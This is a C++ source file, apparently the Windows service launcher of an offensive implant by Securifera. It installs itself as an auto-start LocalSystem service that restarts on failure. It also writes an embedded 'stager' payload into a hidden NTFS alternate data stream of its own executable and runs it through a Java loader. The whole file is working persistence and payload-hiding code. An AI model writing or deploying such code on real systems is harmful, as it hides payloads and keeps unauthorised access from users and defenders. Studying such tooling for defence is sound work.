//***************************************************************
/*  Author: Securifera
/   Description: 
/           This application sets up and runs the java application
/   as a service.
/
/
/
*/
//****************************************************************

#pragma once

#include "svc.h"
#include "..\JAR_Loader\jarldr.h"
#include "..\log.h"
#include "..\utilities.h"

HANDLE stopEvent;
//std::string javaPath = "";

#pragma pack(push, 1)

typedef void (CALLBACK *ULPWSO)(HANDLE,DWORD);
typedef void (CALLBACK *ULPCH)(HANDLE);
typedef void (CALLBACK *ULPEP)(UINT);

//Functions for write service name to resource
typedef HANDLE (CALLBACK *ULPBUP)(LPCSTR, BOOL);
typedef BOOL (CALLBACK *ULPUR)(HANDLE, LPCSTR, LPCSTR, WORD, LPVOID, DWORD);
typedef BOOL (CALLBACK *ULPEUR)(HANDLE, BOOL );

//
//	The main entry point 
//
int main(int argc, char* argv[]){

	std::string serviceName;
	char serviceDescription[MAX_PATH] = "";
	//bool install = false;
	//char* option;
	
	if(argc == 1) {

		//Get the service name
	    ReadServiceName(&serviceName);

		//Log error
		if( serviceName.empty() ){
			Log("Unable to start service.  No service name.");
			return 1;
		}
		
		//Install in the registry, if it works, exit
		if( InstallService( serviceName.c_str(), serviceDescription ) )
			return 0;

		//Service Entry;
		SERVICE_TABLE_ENTRY	lpServiceStartTable[] = {
			{ (LPSTR)serviceName.c_str(), ServiceMain},
			{0, 0}
		};

		//Services.exe launches this process without any params
		if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
			Log("StartServiceCtrlDispatcher failure, error code = %d\n", GetLastError());
		}
		return 0;
	}

	//for (int i = 1; i < argc; i++) { 

	//	option = argv[i];
	//	if(_stricmp("-i",option) == 0){
	//		//Install the service
 //           install = true;
	//	} else if(_stricmp("-n",option) == 0) {
	//		
	//		//Get the service name
	//		if (i + 1 != argc){
	//			serviceName.assign(argv[i + 1]);
	//			i++;
	//		}

 //       } else if(_stricmp("-d",option) == 0) {
	//		
	//		//Get the description
	//		if (i + 1 != argc){
	//			strcpy_s(serviceDescription, argv[i + 1]);
	//			i++;
	//		}
	//	} else if(_stricmp("-l",option) == 0) {
	//		
	//		//Get the service name
	//		ReadServiceName(&serviceName);
	//	
	//		//Set the java path
	//		char javaPathArr[MAX_PATH] = "";
	//		ReadJavaPath(javaPathArr);

	//		//Get the description
	//		printf_s("\nService Name:   %s\n", serviceName);
	//		printf_s("\nPath:  %s\n", javaPathArr);			
	//	
	//	} else if(_stricmp("-j",option) == 0) {
	//		
	//		////Get the description
	//		//if (i + 1 != argc){
	//		//	javaPath = argv[i + 1];
	//		//	i++;
	//		//}

 //       } else if(_stricmp("-u",option) == 0) {
	//		//Uninstall the service
 //           UnInstall();
	//		return 0;
 //       } else if(_stricmp("-h",option) == 0) {
	//		//Print help menu
 //           printf_s("\nUsage:   \"-i\"    Install\n");
	//		printf_s("               \"-n\"    Service Name (required)\n");
	//		printf_s("               \"-d\"    Service Description (optional)\n");
	//		printf_s("         \"-u\"    Uninstall\n");
	//		return 0;
 //       } else {
 //           printf_s("\nInvalid parameter %s\n", argv[i]);
	//		printf_s("Ensure that parameters with spaces are enclosed in quotes.\n\n");
	//	    printf_s("Usage:   \"-i\"    Install\n");
	//		printf_s("               \"-n\"    Service Name (required)\n");
	//		printf_s("               \"-d\"    Service Description (optional)\n");
	//		printf_s("         \"-u\"    Uninstall\n");
	//		return 1;
 //       }    
	//}
	//
	////Ensure all required options were provided
	//if( install ){
	//
	//	if( serviceName.empty() ){
	//		printf_s("Service name is required.  Aborting");		        
	//		return 1;
	//	}

	//	//Install in the registry
	//	Install( serviceName.c_str(), serviceDescription );

	//	//Update the string table with the service name
 //		//UpdateResourceFile( serviceName, javaPath );
	//}

}

//=========================================================================
/**
	Extract the stager and write to ADS
*/
void ExtractStager( char* passedPath ){

    HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.
    char    *lpResLock;        // pointer to resource data
    DWORD   dwSizeRes;
    std::string strOutputLocation;
    std::string strAppLocation;
		
	//Get the resource
	hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");

    hResourceLoaded = LoadResource(NULL, hRes);
    lpResLock = (char *) LockResource(hResourceLoaded);
    dwSizeRes = SizeofResource(NULL, hRes);

	DWORD dwRet = 0;
	std::string classPath = passedPath;
	classPath.append(COLON);

	HANDLE hStream = CreateFile( classPath.c_str(), GENERIC_WRITE,
                             FILE_SHARE_WRITE, NULL,
                             OPEN_ALWAYS, 0, NULL );

    if( hStream != INVALID_HANDLE_VALUE ){
         WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL);
		CloseHandle(hStream);
	}

}

//=========================================================================
/**
	Attempt to get the service name embedded in the file
*/
void ReadServiceName( std::string* svcName ) {	
	char serviceName[MAX_PATH];
	LoadString(NULL, IDS_NAME, serviceName, MAX_PATH );	
	svcName->assign(serviceName);
}

//=========================================================================
/**
	Attempt to get the service name embedded in the file
*/
void ReadJavaPath( char* passedPath ) {	
	LoadString(NULL, IDS_PATH, passedPath, MAX_PATH );	
}


//=========================================================================
/**
	Installs the service
*/
bool InstallService( const char* serviceName, char* serviceDesc ){

	char pPath[MAX_PATH];
	bool installed_svc = false;
	SERVICE_STATUS status;

	ZeroMemory(pPath, MAX_PATH);
	GetModuleFileName(NULL, pPath, MAX_PATH-1);
	SERVICE_DESCRIPTION sd;
	
	//Set the description
	sd.lpDescription = serviceDesc;
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE); 
	if (schSCManager==0) {
		printf_s("OpenSCManager failed, error code = %d\n", GetLastError());
	} else {

		SC_HANDLE service = OpenService(schSCManager, serviceName, SERVICE_ALL_ACCESS);
		if (service == NULL){		

			SC_HANDLE schService = CreateService	( 
				schSCManager,	/* SCManager database      */ 
				serviceName,			/* name of service         */ 
				serviceName,			/* service name to display */ 
				SERVICE_ALL_ACCESS,        /* desired access          */ 
				SERVICE_WIN32_OWN_PROCESS, /* service type            */ 
				SERVICE_AUTO_START,      /* start type              */ 
				SERVICE_ERROR_NORMAL,      /* error control type      */ 
				pPath,			        /* service's binary        */ 
				NULL,                      /* no load ordering group  */ 
				NULL,                      /* no tag identifier       */ 
				NULL,                      /* no dependencies         */ 
				NULL,                      /* LocalSystem account     */ 
				NULL					/* no password             */ 
			);                     

			if (schService==0) {
				Log( "Create Service failure, error code = %d\n", GetLastError());
			} else {

				//Log( "Service %s installed\n", SERVICE_NAME);
				ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);

				//Set an action for when it fails
				SERVICE_FAILURE_ACTIONS sfa;
				SC_ACTION failActions[3];

				failActions[0].Type = SC_ACTION_RESTART; //Failure action: Restart Service
				failActions[0].Delay = 60000; //number of seconds to wait before performing failure action, in milliseconds = 2minutes
				failActions[1].Type = SC_ACTION_RESTART;
				failActions[1].Delay = 60000;
				failActions[2].Type = SC_ACTION_NONE;
				failActions[2].Delay = 60000;

				sfa.dwResetPeriod = INFINITE;
				sfa.lpCommand = NULL;
				sfa.lpRebootMsg = NULL;
				sfa.cActions = 3;
				sfa.lpsaActions = failActions;

				ChangeServiceConfig2(schService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);

				// Start the service:
				if (!StartService(schService, 0, NULL))
				{
					DWORD err = GetLastError();
					if (err == ERROR_SERVICE_ALREADY_RUNNING)
					{
						SetLastError(0);
					}
					else
					{
						#ifdef _DBG
							WriteDebugMsg(true, "[-] Unable to start service.\n"); 
						#endif
						// Failed to start service; clean-up:
						ControlService(service, SERVICE_CONTROL_STOP, &status);
						DeleteService(service);
						CloseServiceHandle(service);
						service = NULL;
						SetLastError(err);
					}
				}

				installed_svc = true;
			}
		}
		
		CloseServiceHandle(schSCManager);
	}	

	return installed_svc;
}

//=========================================================================
/**
	Uninstalls the service
*/
void UnInstall(){

	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) {

		//printf_s( "OpenSCManager failed, error code = %d\n", GetLastError());

	} else {
		SC_HANDLE schService = OpenService( schSCManager, serviceName.c_str(), SERVICE_ALL_ACCESS);
		if (schService==0) {

			long nError = GetLastError();
			//printf_s("OpenService failed, error code = %d\n", nError);

		} else	{

			if(!DeleteService(schService)) {
				printf_s("Failed to delete service %s\n", serviceName);
			} else {
				printf_s("Service %s removed\n",serviceName);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);	
	}
	DeleteFile(LOG_FILE);
}

//=========================================================================
/**
	Service Main
*/
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv) {

	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	HANDLE handleArray[2];
	stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if(stopEvent == NULL) {
		Log("CreateEvent failed, error code = %d\n", GetLastError());
		return;
	}

	//Register Service Handler call back that responds start , stop commands 
    hServiceStatusHandle = RegisterServiceCtrlHandler(serviceName.c_str(), ServiceHandler); 
    if (hServiceStatusHandle==0) {
		Log("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
        return; 
    } 

	if(!SetTheServiceStatus(SERVICE_START_PENDING)) {
		return;
	}

	//Call the java class main method in a separate thread
	handleArray[0] = CreateThread( 
           NULL,              // default security attributes
           0,                 // use default stack size  
           InvokeMainWrapper,        // thread function 
           0,             // argument to thread function 
           0,                 // use default creation flags 
           0);   // returns the thread identifier 
	
	if(!SetTheServiceStatus(SERVICE_RUNNING)) {
		return;
	}

	//Wait for stopEvent
	//WaitForSingleObject(ahandle, INFINITE);

	handleArray[1] = stopEvent;
	WaitForMultipleObjects(2, handleArray, FALSE, INFINITE);
	
	if(!SetTheServiceStatus(SERVICE_STOPPED)) { 
		Log("SetServiceStatus failed, error code = %d\n", GetLastError());
	} 

	if(stopEvent != NULL) {
		CloseHandle(stopEvent);
	}
	
}

//=========================================================================
/**
	The service handler
*/
void WINAPI ServiceHandler(DWORD fdwControl) {
	HANDLE hThread;

	switch(fdwControl) 	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			//Create a separate shutdown thread and wait for the thread to 
			//gracefully shutdown with in a timeout of 20 seconds
			SetTheServiceStatus(SERVICE_STOP_PENDING);
			hThread = CreateThread( 
				NULL,              // default security attributes
				0,                 // use default stack size  
				InvokeShutdownWrapper,        // thread function 
				0,             // argument to thread function 
				0,                 // use default creation flags 
				0);   // returns the thread identifier 

			WaitForSingleObject(hThread, SHUTDOWN_TIMEOUT); 
			SetEvent(stopEvent);
			break; 
		case SERVICE_CONTROL_PAUSE:
			SetTheServiceStatus(SERVICE_PAUSED);
			break;
		default:
			SetTheServiceStatus(SERVICE_RUNNING);
			break;
	};
}

//=========================================================================
/**
	Main Java Entry Point
*/
DWORD WINAPI InvokeMainWrapper(LPVOID lpParam ) {
	
	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	char pPath[MAX_PATH];
	//Get the path to the binary
	ZeroMemory(pPath, MAX_PATH);
	GetModuleFileName(NULL, pPath, MAX_PATH-1);

	//Extract and write to ADS
	std::string adsPath;
	adsPath.assign(pPath);
	adsPath.append(COLON);

	//Check if the ADS exists
	DWORD fileAttr = GetFileAttributes(adsPath.c_str());
    if (0xFFFFFFFF == fileAttr)
        ExtractStager( pPath );

	//Call main
	if( !InvokeMain( &serviceName, adsPath ))
		SetEvent(stopEvent);

	return 0;

}

//=========================================================================
/**
	Shutdown method
*/
DWORD WINAPI InvokeShutdownWrapper( LPVOID lpParam ) {
    
	InvokeShutdown();

	return 0;
}

//=========================================================================
/**
	Sets the service status
*/
BOOL SetTheServiceStatus(DWORD dwStatus) {
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP |  SERVICE_ACCEPT_SHUTDOWN /*| SERVICE_ACCEPT_PAUSE_CONTINUE*/; 
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCurrentState       = dwStatus; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) { 
		Log("SetServiceStatus failure, error code = %d\n", GetLastError());
		return FALSE;
    } 
	return TRUE;
}
